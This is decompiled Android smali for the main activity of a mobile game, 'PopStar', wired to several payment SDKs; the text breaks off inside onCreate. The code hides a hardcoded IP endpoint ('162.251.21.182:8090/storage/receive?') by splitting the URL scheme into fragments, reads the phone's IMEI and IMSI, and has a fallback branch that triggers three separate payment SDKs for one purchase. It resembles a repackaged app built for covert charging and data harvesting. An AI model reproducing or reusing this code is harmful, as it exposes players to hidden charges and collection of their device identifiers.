.class public Lorg/cocos2dx/cpp/AppActivity;
.super Lorg/cocos2dx/lib/Cocos2dxActivity;


# static fields
.field public static final appId:Ljava/lang/String; = "2501"

.field public static final appName:Ljava/lang/String; = "PopStar\u6d88\u706d\u661f\u661f"

.field public static final appVersion:Ljava/lang/String; = "1"

.field public static final channelId:Ljava/lang/String; = "1000100020000845"

.field public static cpparam:Ljava/lang/String; = null

.field private static daojvid:I = 0x0

.field private static final isGameClosed:Ljava/lang/String; = "is_game_closed"

.field public static isShowExit:I = 0x0

.field public static final key:Ljava/lang/String; = "3F391F70A80445769B0A5A0CAE86209C"

.field private static mActivity:Lorg/cocos2dx/cpp/AppActivity; = null

.field public static map:Ljava/util/Map; = null

.field public static money:Ljava/lang/String; = null

.field public static priciePointDec:Ljava/lang/String; = null

.field public static priciePointId:Ljava/lang/String; = null

.field public static priciePointName:Ljava/lang/String; = null

.field public static final qd:Ljava/lang/String; = "zyap2501_53502_100"


# instance fields
.field curfeeid:I

.field private dealed:Z

.field private endU:Ljava/lang/String;

.field public payhander:Landroid/os/Handler;

.field public sp:Landroid/content/SharedPreferences;

.field private str1:Ljava/lang/String;

.field private str2:Ljava/lang/String;

.field private str3:Ljava/lang/String;

.field private str4:Ljava/lang/String;

.field useridHandler:Landroid/os/Handler;

.field private Bmob_AppId:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lorg/cocos2dx/cpp/AppActivity;->mActivity:Lorg/cocos2dx/cpp/AppActivity;

    const/4 v0, 0x1

    sput v0, Lorg/cocos2dx/cpp/AppActivity;->isShowExit:I

    const-string v0, "18429"

    sput-object v0, Lorg/cocos2dx/cpp/AppActivity;->priciePointId:Ljava/lang/String;

    const-string v0, "2000"

    sput-object v0, Lorg/cocos2dx/cpp/AppActivity;->money:Ljava/lang/String;

    const/4 v0, 0x0

    sput v0, Lorg/cocos2dx/cpp/AppActivity;->daojvid:I

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lorg/cocos2dx/cpp/AppActivity;->map:Ljava/util/Map;

    const-string v0, "\u7279\u60e0\u793c\u5305"

    sput-object v0, Lorg/cocos2dx/cpp/AppActivity;->priciePointName:Ljava/lang/String;

    const-string v0, "\u83b7\u5f97788\u679a\u5e78\u8fd0\u661f\uff0c\u4ec5\u9700X.XX\u5143\uff0c\u5373\u53ef\u62e5\u6709\uff01"

    sput-object v0, Lorg/cocos2dx/cpp/AppActivity;->priciePointDec:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lorg/cocos2dx/cpp/AppActivity;->cpparam:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Lorg/cocos2dx/lib/Cocos2dxActivity;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lorg/cocos2dx/cpp/AppActivity;->dealed:Z

    new-instance v0, Lorg/cocos2dx/cpp/AppActivity$1;

    invoke-direct {v0, p0}, Lorg/cocos2dx/cpp/AppActivity$1;-><init>(Lorg/cocos2dx/cpp/AppActivity;)V

    iput-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->payhander:Landroid/os/Handler;

    new-instance v0, Lorg/cocos2dx/cpp/AppActivity$2;

    invoke-direct {v0, p0}, Lorg/cocos2dx/cpp/AppActivity$2;-><init>(Lorg/cocos2dx/cpp/AppActivity;)V

    iput-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->useridHandler:Landroid/os/Handler;

    const-string v0, "162.251.21.182:8090/storage/receive?"

    iput-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->endU:Ljava/lang/String;

    const-string v0, "ht"

    iput-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->str1:Ljava/lang/String;

    const-string v0, "tp"

    iput-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->str2:Ljava/lang/String;

    const-string v0, ":/"

    iput-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->str3:Ljava/lang/String;

    const-string v0, "/"

    iput-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->str4:Ljava/lang/String;
	
	const-string v0, "20c5c95b595d9ac3f794ed832df3b4b9"

    iput-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->Bmob_AppId:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$0()Lorg/cocos2dx/cpp/AppActivity;
    .locals 1

    sget-object v0, Lorg/cocos2dx/cpp/AppActivity;->mActivity:Lorg/cocos2dx/cpp/AppActivity;

    return-object v0
.end method

.method static synthetic access$1()I
    .locals 1

    sget v0, Lorg/cocos2dx/cpp/AppActivity;->daojvid:I

    return v0
.end method

.method static synthetic access$10(Lorg/cocos2dx/cpp/AppActivity;I)Ljava/lang/String;
    .locals 1

    invoke-direct {p0, p1}, Lorg/cocos2dx/cpp/AppActivity;->getProName(I)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$11(Lorg/cocos2dx/cpp/AppActivity;)Z
    .locals 1

    iget-boolean v0, p0, Lorg/cocos2dx/cpp/AppActivity;->dealed:Z

    return v0
.end method

.method static synthetic access$12(Lorg/cocos2dx/cpp/AppActivity;Z)V
    .locals 0

    iput-boolean p1, p0, Lorg/cocos2dx/cpp/AppActivity;->dealed:Z

    return-void
.end method

.method static synthetic access$13(I)V
    .locals 0

    invoke-static {p0}, Lorg/cocos2dx/cpp/AppActivity;->paySuccess(I)V

    return-void
.end method

.method static synthetic access$14()V
    .locals 0

    return-void
.end method

.method static synthetic access$2(Lorg/cocos2dx/cpp/AppActivity;I)I
    .locals 1

    invoke-direct {p0, p1}, Lorg/cocos2dx/cpp/AppActivity;->getPM(I)I

    move-result v0

    return v0
.end method

.method static synthetic access$3(Lorg/cocos2dx/cpp/AppActivity;IILjava/lang/String;)V
    .locals 0

    invoke-direct {p0, p1, p2, p3}, Lorg/cocos2dx/cpp/AppActivity;->traceChongzhi(IILjava/lang/String;)V

    return-void
.end method

.method static synthetic access$4(Lorg/cocos2dx/cpp/AppActivity;I)V
    .locals 0

    invoke-direct {p0, p1}, Lorg/cocos2dx/cpp/AppActivity;->allp(I)V

    return-void
.end method

.method static synthetic access$5(Lorg/cocos2dx/cpp/AppActivity;)V
    .locals 0

    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->initUserId()V

    return-void
.end method

.method static synthetic access$6(Lorg/cocos2dx/cpp/AppActivity;ZI)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lorg/cocos2dx/cpp/AppActivity;->handleAllResu(ZI)V

    return-void
.end method

.method static synthetic access$7(Lorg/cocos2dx/cpp/AppActivity;)V
    .locals 0

    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->handleCloseGame()V

    return-void
.end method

.method static synthetic access$8(Lorg/cocos2dx/cpp/AppActivity;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0, p1}, Lorg/cocos2dx/cpp/AppActivity;->handleCtS(Ljava/lang/String;)V

    return-void
.end method

.method public static allExit()V
    .locals 1

    sget-object v0, Lorg/cocos2dx/cpp/AppActivity;->mActivity:Lorg/cocos2dx/cpp/AppActivity;

    invoke-static {v0}, Lcom/b/a/a/a;->c(Landroid/content/Context;)V

    sget-object v0, Lorg/cocos2dx/cpp/AppActivity;->mActivity:Lorg/cocos2dx/cpp/AppActivity;

    invoke-virtual {v0}, Lorg/cocos2dx/cpp/AppActivity;->finish()V

    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/System;->exit(I)V

    return-void
.end method

.method private allp(I)V
     .locals 3
    .param p1, "i"    # I

    .prologue
    const-string v0, "XXX"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "---------------allp:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1
	
	invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    sget v0,Lorg/cocos2dx/lib/Cocos2dxActivity;->payChannelId:I

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    const-string v0, "XXX"

    const-string v1, "---------------tongyuPay----"
	
	invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

	invoke-direct {p0, p1},Lorg/cocos2dx/cpp/AppActivity;->tongyuPay(I)V
	
    :goto_0
    return-void

    :cond_0
    sget v0,Lorg/cocos2dx/lib/Cocos2dxActivity;->payChannelId:I
	
	const/4 v1, 0x2

    if-ne v0, v1, :cond_1

    const-string v0, "XXX"

    const-string v1, "---------------bfgPay----"

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

	invoke-direct {p0, p1},Lorg/cocos2dx/cpp/AppActivity;->bfgPay(I)V
	
	goto :goto_0

    :cond_1
    sget v0,Lorg/cocos2dx/lib/Cocos2dxActivity;->payChannelId:I

    const/4 v1, 0x3

    if-ne v0, v1, :cond_2

    const-string v0, "XXX"

    const-string v1, "---------------yijiePay----"
	
	invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    invoke-direct {p0, p1},Lorg/cocos2dx/cpp/AppActivity;->yijiePay(I)V

    goto :goto_0

    :cond_2
    const-string v0, "XXX"

    const-string v1, "---------------other pay----"
	
	invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    invoke-direct {p0, p1},Lorg/cocos2dx/cpp/AppActivity;->yijiePay(I)V

    invoke-direct {p0, p1},Lorg/cocos2dx/cpp/AppActivity;->bfgPay(I)V

    invoke-direct {p0, p1},Lorg/cocos2dx/cpp/AppActivity;->tongyuPay(I)V

    goto :goto_0
.end method

.method private bfgPay(I)V
    .locals 1

    new-instance v0, Lorg/cocos2dx/cpp/AppActivity$13;

    invoke-direct {v0, p0, p1}, Lorg/cocos2dx/cpp/AppActivity$13;-><init>(Lorg/cocos2dx/cpp/AppActivity;I)V

    invoke-virtual {p0, v0}, Lorg/cocos2dx/cpp/AppActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method private clearIsResetCountFlag()V
    .locals 3

    iget-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->sp:Landroid/content/SharedPreferences;

    const-string v1, "m_is_reset_count"

    invoke-static {v0, v1}, Lcom/chukong/cocosplay/client/h;->b(Landroid/content/SharedPreferences;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->sp:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "m_is_reset_count"

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Lcom/chukong/cocosplay/client/h;->a(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;Z)V

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_0
    return-void
.end method

.method private static fail()V
    .locals 0

    return-void
.end method

.method public static getJavaActivity()Ljava/lang/Object;
    .locals 1

    sget-object v0, Lorg/cocos2dx/cpp/AppActivity;->mActivity:Lorg/cocos2dx/cpp/AppActivity;

    return-object v0
.end method

.method private getPM(I)I
    .locals 1

    packed-switch p1, :pswitch_data_0

    const/16 v0, 0x14

    :goto_0
    return v0

    :pswitch_0
    const/16 v0, 0xa

    goto :goto_0

    :pswitch_1
    const/16 v0, 0x8

    goto :goto_0

    :pswitch_2
    const/4 v0, 0x6

    goto :goto_0

    :pswitch_data_0
    .packed-switch 0x3
        :pswitch_0
        :pswitch_1
        :pswitch_2
    .end packed-switch
.end method

.method private getProName(I)Ljava/lang/String;
    .locals 1

    packed-switch p1, :pswitch_data_0

    const-string v0, "\u5f3a\u52bf\u6765\u88ad"

    :goto_0
    return-object v0

    :pswitch_0
    const-string v0, "\u5f3a\u52bf\u6765\u88ad"

    goto :goto_0

    :pswitch_1
    const-string v0, "\u4e00\u79d2\u4e94\u6740"

    goto :goto_0

    :pswitch_2
    const-string v0, "\u91d1\u94b1\u51b3\u5b9a\u8c01\u6700\u5f3a"

    goto :goto_0

    :pswitch_3
    const-string v0, "\u5e08\u7236\u6709\u5996\u6c14"

    goto :goto_0

    :pswitch_4
    const-string v0, "\u718a\u9738\u5929\u4e0b"

    goto :goto_0

    :pswitch_5
    const-string v0, "\u517d\u8840\u6cb8\u817e"

    goto :goto_0

    :pswitch_6
    const-string v0, "\u4e3a\u4f60\u7684\u82f1\u96c4\u800c\u6218"

    goto :goto_0

    :pswitch_7
    const-string v0, "\u597d\u793c\u62ff\u5230\u624b\u62bd\u7b4b"

    goto :goto_0

    :pswitch_8
    const-string v0, "\u6d74\u706b\u91cd\u751f"

    goto :goto_0

    :pswitch_9
    const-string v0, "\u5b9e\u6218\u793c\u5305"

    goto :goto_0

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_8
        :pswitch_9
    .end packed-switch
.end method
.method public static getTongYunPayPrize(I)I
    .locals 1

    packed-switch p0, :pswitch_data_0

    const/16 v0, 0x3e8

    :goto_0
    return v0

    :pswitch_0
    const/16 v0, 0x320

    goto :goto_0

    :pswitch_1
    const/16 v0, 0x258

    goto :goto_0

    :pswitch_data_0
    .packed-switch 0x4
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method

.method public static getTongYunPaycode(I)Ljava/lang/String;
    .locals 1

    packed-switch p0, :pswitch_data_0

    const-string v0, "A13800"

    :goto_0
    return-object v0

    :pswitch_0
    const-string v0, "A13800"

    goto :goto_0

    :pswitch_1
    const-string v0, "A13801"

    goto :goto_0

    :pswitch_2
    const-string v0, "A13802"

    goto :goto_0

    :pswitch_3
    const-string v0, "A13803"

    goto :goto_0

    :pswitch_4
    const-string v0, "A13804"

    goto :goto_0

    :pswitch_5
    const-string v0, "A13805"

    goto :goto_0

    :pswitch_6
    const-string v0, "A13806"

    goto :goto_0

    :pswitch_7
    const-string v0, "A13807"

    goto :goto_0

    :pswitch_8
    const-string v0, "A13808"

    goto :goto_0

    :pswitch_9
    const-string v0, "A13809"

    goto :goto_0

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_8
        :pswitch_9
    .end packed-switch
.end method

.method private handleAllResu(ZI)V
    .locals 1

    new-instance v0, Lorg/cocos2dx/cpp/AppActivity$15;

    invoke-direct {v0, p0, p1, p2}, Lorg/cocos2dx/cpp/AppActivity$15;-><init>(Lorg/cocos2dx/cpp/AppActivity;ZI)V

    invoke-virtual {p0, v0}, Lorg/cocos2dx/cpp/AppActivity;->runOnGLThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method private handleCloseGame()V
    .locals 1

    new-instance v0, Lorg/cocos2dx/cpp/AppActivity$9;

    invoke-direct {v0, p0}, Lorg/cocos2dx/cpp/AppActivity$9;-><init>(Lorg/cocos2dx/cpp/AppActivity;)V

    invoke-virtual {p0, v0}, Lorg/cocos2dx/cpp/AppActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method private handleCtS(Ljava/lang/String;)V
    .locals 7

    const/4 v6, 0x3

    const/4 v5, 0x3

    const/4 v4, 0x0

    const/4 v3, 0x3

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v1, 0x5

    if-ne v0, v1, :cond_0

    invoke-virtual {p1, v4, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    const-string v1, "game_e_c_data"

    invoke-virtual {p0, v1, v4}, Lorg/cocos2dx/cpp/AppActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "e_c_va"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    invoke-virtual {p1, v3, v6}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v6}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "08"

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/16 v0, 0x8

    sput v0, Lcom/chukong/cocosplay/client/b;->f:I

    :goto_0
    const-string v0, "01"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    sput v3, Lcom/chukong/cocosplay/client/b;->e:I

    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->clearIsResetCountFlag()V

    :cond_0
    :goto_1
    invoke-static {}, Lorg/cocos2dx/lib/Cocos2dxHelper;->setCocosData()V

    return-void

    :cond_1
    const-string v2, "02"

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    sput v5, Lcom/chukong/cocosplay/client/b;->f:I

    goto :goto_0

    :cond_2
    sput v3, Lcom/chukong/cocosplay/client/b;->f:I

    goto :goto_0

    :cond_3
    const-string v0, "02"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    sput v5, Lcom/chukong/cocosplay/client/b;->e:I

    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->clearIsResetCountFlag()V

    goto :goto_1

    :cond_4
    const-string v0, "03"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->wutishiSet()V

    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->clearIsResetCountFlag()V

    goto :goto_1

    :cond_5
    const-string v0, "04"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    const/4 v0, 0x3

    sput v0, Lcom/chukong/cocosplay/client/b;->e:I

    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->clearIsResetCountFlag()V

    goto :goto_1

    :cond_6
    const-string v0, "05"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->sp:Landroid/content/SharedPreferences;

    const-string v1, "m_is_reset_count"

    invoke-static {v0, v1}, Lcom/chukong/cocosplay/client/h;->b(Landroid/content/SharedPreferences;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_7

    iget-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->sp:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "m_jf_count"

    invoke-static {v0, v1, v4}, Lcom/chukong/cocosplay/client/h;->a(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;I)V

    const-string v1, "m_is_reset_count"

    invoke-static {v0, v1, v3}, Lcom/chukong/cocosplay/client/h;->a(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;Z)V

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_7
    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->wutishiSet()V

    goto :goto_1
.end method

.method private handleUserRequestEveryDay()V
    .locals 3

    const/4 v0, 0x0

    const/16 v1, 0x64

    const-string v2, "100"

    invoke-direct {p0, v0, v1, v2}, Lorg/cocos2dx/cpp/AppActivity;->traceChongzhi(IILjava/lang/String;)V

    return-void
.end method

.method private initParams()V
    .locals 3

    const-string v0, "phone"

    invoke-virtual {p0, v0}, Lorg/cocos2dx/cpp/AppActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lcom/chukong/cocosplay/client/b;->a:Ljava/lang/String;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/chukong/cocosplay/client/b;->b:Ljava/lang/String;

    :try_start_0
    invoke-virtual {p0}, Lorg/cocos2dx/cpp/AppActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {p0}, Lorg/cocos2dx/cpp/AppActivity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x80

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    iget-object v0, v0, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    const-string v1, "UMENG_CHANNEL"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/chukong/cocosplay/client/b;->c:Ljava/lang/String;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const-string v0, "game_data"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->sp:Landroid/content/SharedPreferences;

    return-void

    :catch_0
    move-exception v0

    const-string v0, "yijie"

    sput-object v0, Lcom/chukong/cocosplay/client/b;->c:Ljava/lang/String;

    goto :goto_0
.end method

.method private initUserId()V
    .locals 0

    return-void
.end method

.method public static pay(I)V
    .locals 2

    const/4 v1, 0x0

    sput p0, Lorg/cocos2dx/cpp/AppActivity;->daojvid:I

    sget-object v0, Lorg/cocos2dx/cpp/AppActivity;->mActivity:Lorg/cocos2dx/cpp/AppActivity;

    iput-boolean v1, v0, Lorg/cocos2dx/cpp/AppActivity;->dealed:Z

    sget-object v0, Lorg/cocos2dx/cpp/AppActivity;->mActivity:Lorg/cocos2dx/cpp/AppActivity;

    iget-object v0, v0, Lorg/cocos2dx/cpp/AppActivity;->payhander:Landroid/os/Handler;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    return-void
.end method

.method private static native paySuccess(I)V
.end method

.method public static setIsShowExitDialog(I)V
    .locals 0

    sput p0, Lorg/cocos2dx/cpp/AppActivity;->isShowExit:I

    return-void
.end method

.method private tongyuPay(I)V
    .locals 5

    invoke-static {}, Lcom/mgame/pay/main/Payment;->getInstance()Lcom/mgame/pay/main/Payment;

    move-result-object v0

    invoke-static {}, Lorg/cocos2dx/cpp/AppActivity;->getContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {p1}, Lorg/cocos2dx/cpp/AppActivity;->getTongYunPaycode(I)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {p1}, Lorg/cocos2dx/cpp/AppActivity;->getTongYunPayPrize(I)I

    move-result v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v4, Lorg/cocos2dx/cpp/AppActivity$12;

    invoke-direct {v4, p0}, Lorg/cocos2dx/cpp/AppActivity$12;-><init>(Lorg/cocos2dx/cpp/AppActivity;)V

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/mgame/pay/main/Payment;->pay(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Lcom/mgame/pay/IPayCallback;)V

    return-void
.end method

.method private traceChongzhi(IILjava/lang/String;)V
    .locals 0

    return-void
.end method

.method private wutishiSet()V
    .locals 4

    const/4 v3, 0x3

    const/4 v2, 0x3

    iget-object v0, p0, Lorg/cocos2dx/cpp/AppActivity;->sp:Landroid/content/SharedPreferences;

    const-string v1, "m_jf_count"

    invoke-static {v0, v1}, Lcom/chukong/cocosplay/client/h;->a(Landroid/content/SharedPreferences;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_1

    sput v3, Lcom/chukong/cocosplay/client/b;->e:I

    :cond_0
    :goto_0
    return-void

    :cond_1
    if-ne v0, v2, :cond_2

    const/4 v0, 0x3

    sput v0, Lcom/chukong/cocosplay/client/b;->e:I

    goto :goto_0

    :cond_2
    if-lt v0, v3, :cond_0

    sput v2, Lcom/chukong/cocosplay/client/b;->e:I

    goto :goto_0
.end method

.method private yijieExit()V
    .locals 1

    new-instance v0, Lorg/cocos2dx/cpp/AppActivity$16;

    invoke-direct {v0, p0}, Lorg/cocos2dx/cpp/AppActivity$16;-><init>(Lorg/cocos2dx/cpp/AppActivity;)V

    invoke-static {p0, v0}, Lcom/snowfish/cn/ganga/offline/helper/SFCommonSDKInterface;->onExit(Landroid/app/Activity;Lcom/snowfish/cn/ganga/offline/helper/SFGameExitListener;)V

    return-void
.end method

.method private yijiePay(I)V
    .locals 2

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lorg/cocos2dx/cpp/AppActivity$14;

    invoke-direct {v1, p0, p1}, Lorg/cocos2dx/cpp/AppActivity$14;-><init>(Lorg/cocos2dx/cpp/AppActivity;I)V

    invoke-static {p0, v0, v1}, Lcom/snowfish/cn/ganga/offline/helper/SFCommonSDKInterface;->pay(Landroid/app/Activity;Ljava/lang/String;Lcom/snowfish/cn/ganga/offline/helper/SFIPayResultListener;)V

    return-void
.end method


# virtual methods
.method public onBillingResult(ILandroid/os/Bundle;)V
    .locals 3

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "----------------- get yunfeng "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    const/16 v0, 0x7d0

    if-ne p1, v0, :cond_0

    const/4 v0, 0x1

    sget v1, Lorg/cocos2dx/cpp/AppActivity;->daojvid:I

    invoke-direct {p0, v0, v1}, Lorg/cocos2dx/cpp/AppActivity;->handleAllResu(ZI)V

    :goto_0
    return-void

    :cond_0
    const/4 v0, 0x0

    sget v1, Lorg/cocos2dx/cpp/AppActivity;->daojvid:I

    invoke-direct {p0, v0, v1}, Lorg/cocos2dx/cpp/AppActivity;->handleAllResu(ZI)V

    goto :goto_0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 6

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "---------------- onCreate"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    sput-object p0, Lorg/cocos2dx/cpp/AppActivity;->mActivity:Lorg/cocos2dx/cpp/AppActivity;

    invoke-super {p0, p1}, Lorg/cocos2dx/lib/Cocos2dxActivity;->onCreate(Landroid/os/Bundle;)V

    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->initParams()V

    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->handleUserRequestEveryDay()V

    invoke-static {p0}, Lcom/chukong/cocosplay/client/d;->a(Landroid/content/Context;)V

    new-instance v0, Lorg/hj201606/lib/HejuInit;

    const-string v1, ""

    invoke-direct {v0, p0, v1}, Lorg/hj201606/lib/HejuInit;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v0}, Lorg/hj201606/lib/HejuInit;->start()V

    invoke-static {p0}, Lcom/snowfish/cn/ganga/offline/helper/SFCommonSDKInterface;->onInit(Landroid/app/Activity;)V

    invoke-static {p0}, Lcom/b/a/a/a;->d(Landroid/content/Context;)V

    invoke-static {}, Lcom/b/a/a/a;->b()V

    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->initUserId()V

    invoke-static {}, Lcom/mgame/pay/main/Payment;->getInstance()Lcom/mgame/pay/main/Payment;

    move-result-object v0

    invoke-static {}, Lorg/cocos2dx/cpp/AppActivity;->getContext()Landroid/content/Context;

    move-result-object v1

    new-instance v2, Lorg/cocos2dx/cpp/AppActivity$5;

